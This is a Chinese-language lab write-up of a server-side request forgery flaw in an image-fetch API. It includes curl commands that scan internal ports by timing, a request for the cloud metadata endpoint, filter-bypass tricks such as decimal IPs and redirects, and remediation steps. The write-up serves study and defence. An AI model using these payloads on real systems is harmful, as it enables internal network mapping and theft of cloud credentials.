这篇是靶场练习的记录，环境是本地搭的，所有请求都只在实验网段里发出。写下来主要是为了把复现思路整理清楚，不是教程。

## 漏洞点在哪

目标是一个图片抓取接口，前端只需要传一个 `url`，后端会替用户去请求这个地址并把图片返回。问题很典型：服务端没有对目标地址做任何限制。

```http
POST /api/fetch-image HTTP/1.1
Host: target.local
Content-Type: application/json

{"url": "http://127.0.0.1:8080/admin"}
```

请求发出去之后，返回体虽然还是图片的响应格式，但响应时长和内容长度都会随目标端口变化，这就是探测的切入点。

## 第一步：确认能打内网

先试最常见的回环地址和几个内网段，用响应时间做侧信道：

```bash
for port in 22 80 3306 6379 8080; do
  curl -s -o /dev/null -w "127.0.0.1:$port -> %{time_total}s\n" \
    -X POST http://target.local/api/fetch-image \
    -H 'Content-Type: application/json' \
    -d "{\"url\":\"http://127.0.0.1:$port/\"}"
done
```

开放的端口明显更快返回错误，关闭的端口会等到超时。这一步就能画出内网的大致轮廓。

## 第二步：读云主机元数据

如果目标跑在云上，最值得试的地址是元数据服务。不同厂商的地址不一样，这里用常见的 169.254.169.254：

```bash
curl -s -X POST http://target.local/api/fetch-image \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://169.254.169.254/latest/meta-data/"}'
```

有些实现会返回纯文本而不是图片，接口的解析逻辑可能会直接把它当内容吐回来。

![靶场里返回的元数据目录](/images/ssrf-terminal.png "元数据服务返回的目录列表，说明服务端没有做协议与地址校验")

## 第三步：绕过常见过滤

如果后端加了黑名单，常见的绕过方式有几种：

- 用十进制 IP：`http://2130706433/` 等价于 `127.0.0.1`
- 用 `0.0.0.0`、`[::1]` 这类写法
- 用短域名或指向内网的域名
- 利用 302 跳转：先指向一个外网地址，再跳回内网

```python
# 只是演示思路：十进制 IP 的转换
import ipaddress

ip = int(ipaddress.IPv4Address("127.0.0.1"))
print(f"http://{ip}/")  # http://2130706433/
```

## 修复方向

复现完之后对照官方修复说明，主要做了三件事：

1. 解析 URL 后校验协议，只允许 `http` 和 `https`
2. 对目标地址做 DNS 解析，拒绝回环、内网和链路本地地址
3. 抓取时禁用跳转，或者对每次跳转重新校验

第三条最容易被漏掉。只校验第一次请求的地址，遇到 302 一样能绕过。

## 一点体会

SSRF 的危险不在于“能访问一个地址”，而在于服务端往往比攻击者站得更靠内。同一个接口，从外面看只是抓张图，从里面看可能是整片内网的入口。

复现完之后，我把练习环境里的几个类似接口都翻了一遍，发现有同样问题的还不少。这也算是靶场的额外收获。
